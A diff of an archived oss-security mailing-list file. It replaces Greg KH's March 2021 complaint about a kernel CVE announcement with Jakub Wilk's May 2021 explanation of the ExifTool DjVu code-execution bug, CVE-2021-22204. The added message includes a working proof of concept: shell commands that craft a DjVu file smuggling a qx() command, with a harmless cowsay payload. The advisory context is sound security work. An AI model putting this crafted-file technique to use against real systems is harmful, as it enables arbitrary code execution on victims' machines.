@@ -1,76 +1,43 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/18/4
-Message-ID: <YFNCtWmsYrtYQeEJ@kroah.com>
-Date: Thu, 18 Mar 2021 13:08:21 +0100
-From: Greg KH <greg@...ah.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Re: CVE-2021-20219 Linux kernel: improper synchronization in flush_to_ldisc() can lead to DoS
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/10/5
+Message-ID: <20210510134618.dcarjcit5ftpomdm@jwilk.net>
+Date: Mon, 10 May 2021 15:46:18 +0200
+From: Jakub Wilk <jwilk@...lk.net>
+To: <oss-security@...ts.openwall.com>
+Subject: Re: [CVE-2021-22204] ExifTool - Arbitrary code execution in the DjVu module when parsing a malicious image
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Mar 18, 2021 at 05:03:53PM +0530, Rohit Keshri wrote:
-> Hello Team,
-> 
-> > Given that the above CVE is not public in any database that I can find,
-> > one can only hope that the text will reflect what really is happening
-> > here.  Rohit, why was this even published?
-> 
-> > Again, stuff like this is just causing extra work by everyone else for
-> > no good reason that I can see.
-> 
-> 
-> I understand and apologize for the confusion.
-> 
-> 
-> This issue was reported for rhel7 to us (which was not seen in rhel8
-> or later versions),  but it also  applies to  kernel before this
-> ('3d63b7e4ae0dc') patch or kernel without this patch.
-> 
-> 
-> $ git tag --contains  3d63b7e4ae0dc
-> v4.18
-> v4.18-rc3
-> v4.18-rc4
-> v4.18-rc5
-> v4.18-rc6
-> v4.18-rc7
-> v4.18-rc8
-> 
-> ..
+* William Bowling <will@...wling.info>, 2021-05-09, 14:32:
+>ExifTool 7.44 to 12.23 has a bug in the DjVu module which allows for 
+>arbitrary code execution when parsing malicious images.
 
-`git describe` should be used instead for stuff like this:
-	$ git describe --contains 3d63b7e4ae0dc
-	v4.18-rc3~4^2~4
+Using eval() to parse C-like strings is undoubtedly a terrible idea, but 
+the code does attempt to neutralize the input, and it wasn't immediately 
+obvious to me where the bug is. It turns out the way it determines where 
+the string ends is incorrect:
 
-But none of that takes into account for the backporting of commits into
-the stable tree, you need a different tool for that, which many of us
-have our own.  If you use that you will see that the above commit really
-is in lots of fixed kernel trees:
+    # we're good unless quote was escaped by odd number of backslashes
+    last unless $tok =~ /(\\+)$/ and length($1) & 0x01;
 
-$ id_found_in 3d63b7e4ae0dc5e02d28ddd2fa1f945defc68d81
-3.16.61 3.18.115 4.4.140 4.9.112 4.14.54 4.17.5 4.18
+But $ doesn't match only the end of the string; it matches also before 
+the trailing newline. You need \z if you want only the former. (But of 
+course in this case ditching eval(), rather than fine-tuning the regex, 
+was the right course of action.)
 
-So this means that your RHEL 7 kernel, which is based on 3.10, somehow
-missed picking this up when it was backported to the "newer" stable
-kernel trees almost 3 years ago.
+Proof of concept:
 
-Is that a mistake in your kernel development process that should be
-resolved?
+   $ printf 'P1 1 1 0' > moo.pbm
+   $ cjb2 moo.pbm moo.djvu
+   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned>&2);#"' >> moo.djvu
+   $ exiftool moo.djvu > /dev/null
+    _______
+   < pwned >
+    -------
+           \   ^__^
+            \  (oo)\_______
+               (__)\       )\/\
+                   ||----w |
+                   ||     ||
 
-> Since this issue was reported to us,  identified as a security flaw,
-> and was fixed in the upstream, we decided to assign a CVE.
-
-But then you announce that CVE to the community with no context or
-information which only causes us to have to do lots of extra work.
-
-If it's Red Hat's goal to get some people in the Linux kernel community
-mad at them, it's working well.  If it's Red Hat's goal to somehow help
-the community out with this type of announcement, it's not working at
-all.  You failed to site the fix, when it was, who did the fix, who
-found the fix, and where it was actually fixed in, all things that
-people here actually would like to know.
-
-So, what really is your goal here?
-
-thanks,
-
-greg k-h
+-- 
+Jakub Wilk
